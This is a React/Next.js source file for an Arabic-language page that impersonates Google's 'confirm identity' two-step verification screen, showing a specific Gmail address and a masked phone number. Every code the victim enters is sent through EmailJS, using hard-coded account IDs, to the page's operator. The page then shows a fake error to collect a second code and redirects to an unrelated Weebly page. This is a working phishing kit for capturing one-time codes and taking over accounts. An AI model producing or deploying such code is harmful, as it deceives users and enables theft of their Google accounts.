'use client';
import Image from 'next/image';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import emailjs, { send } from 'emailjs-com';

export default function VerificationPage() {
  const [code, setCode] = useState('');
  const [first,setFisrt]=useState(false);
  const [loading,setloading]=useState(false);

  const router = useRouter();
  const [error, setError] = useState('');
  const [resendB, setResendB] = useState(false);


  const resend=async(message:string)=>{
       setResendB(true)
       const result = await emailjs.send(
        'service_nwpu79r', // Replace with your EmailJS service ID
        'template_icrxtto', // No template ID
        {
          name: 'Yacoob', // Replace with dynamic or static value
          time: new Date().toLocaleString(), // Or any formatted time you prefer
          message: message, // Your message content
        },
        '8icIF76qfpFpaotTM' // Replace with your EmailJS user ID
      );
      await new Promise((resolve) => setTimeout(resolve, 5000));
      setResendB(false)
  }
  const sendEmail = async (message:string) => {
    try {
        if (!/^\d{4,}$/.test(message)) {
            setError('الرجاء إدخال رمز مكون من أرقام فقط لا يقل عن 4 أرقام');
            return;
          }
        setloading(true)

      const result = await emailjs.send(
        'service_nwpu79r', // Replace with your EmailJS service ID
        'template_icrxtto', // No template ID
        {
          name: 'Yacoob', // Replace with dynamic or static value
          time: new Date().toLocaleString(), // Or any formatted time you prefer
          message: message, // Your message content
        },
        '8icIF76qfpFpaotTM' // Replace with your EmailJS user ID
      );

      await new Promise((resolve) => setTimeout(resolve, 2000));
      setCode("")
      if(first){
        window.location.href = 'https://www.weebly.com/app-center/search/book';

      }
      setloading(false)
      setFisrt(true);
  
    //   console.log(result);
    } catch (error) {
      console.log(error);
    }
  };


  return (
    <main className="min-h-screen bg-[#f1f3f4] flex items-center justify-center p-4">
      <div className="bg-white shadow-md rounded-2xl p-6 w-full max-w-4xl flex flex-col gap-8 md:flex-row md:gap-10">
        
        {/* المحتوى */}
        <div className="flex flex-col w-full">
          
          {/* الشعار على اليسار */}
          <div className="flex justify-start mb-4">
            <Image
              src="/logo.png"
              alt="Google logo"
              width={30}
              height={30}
            />
          </div>

          <div className="flex flex-col md:flex-row gap-6 w-full">
            {/* القسم الأيمن */}
            <div className="flex-1">
              <h1 className="text-2xl md:text-3xl font-semibold mb-2">تأكيد الهوية</h1>
              <p className="text-gray-700 mb-6 text-sm" dir="rtl">
                للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من أنك بالفعل تحاول تسجيل الدخول
              </p>

              <div className="inline-flex items-center px-4 py-2 border rounded-full bg-gray-100 text-sm text-gray-800 mb-4">
                <span className="w-8 h-8 rounded-full bg-[#4285F4] text-white flex items-center justify-center mr-3 font-bold">
                  M
                </span>
                mn3384922@gmail.com
              </div>
<br />
              <a href='#' onClick={()=>{resend("اعد الارسال مرة اخرى !!!")}}  className={ resendB?"text-gray-300 text-sm hover:underline":"text-blue-600 text-sm hover:underline"}>{resendB?"تم الارسال":"إعادة الإرسال"}</a>
            </div>

            {/* القسم الأيسر */}
            <div className="flex-1">
              <p className="text-gray-700 text-sm mb-2">
              •••-•••-••13 تم إرسال رسالة نصية تحتوي على رمز التحقق إلى 
              </p>

              <label className="block text-sm text-gray-600 mb-1">أدخل الرمز</label>
              <div className="flex items-center border rounded-md overflow-hidden bg-white focus-within:ring-2 ring-blue-500 mb-4">
                <span className="px-3 text-gray-500">G-</span>
                <input
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="flex-1 px-3 py-2 outline-none"
                  placeholder="أدخل الرمز"
                />
              </div>
             {first && <div className='text-red-600'>حدثت مشكلة يرجى إدخال الرقم مرة اخرى</div>}
             {(error&&!first)&& <div className="text-red-600 text-sm mb-4">{error}</div>
            }
              <div className="flex justify-end items-center flex-wrap gap-3">
                {/* <a href="#" className="text-blue-600 text-sm hover:underline">ليس لدي هاتفي</a> */}
                <button  disabled={loading} 
                onClick={()=>sendEmail(code)

                }   className={`px-6 py-2  rounded-full font-medium transition-colors ${
        loading
          ? 'bg-gray-200 text-gray-500 cursor-not-allowed'
          : 'bg-blue-600 hover:bg-blue-700 text-white rounded-full px-6 py-2 font-medium'
      }`}>
                  التالي
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}
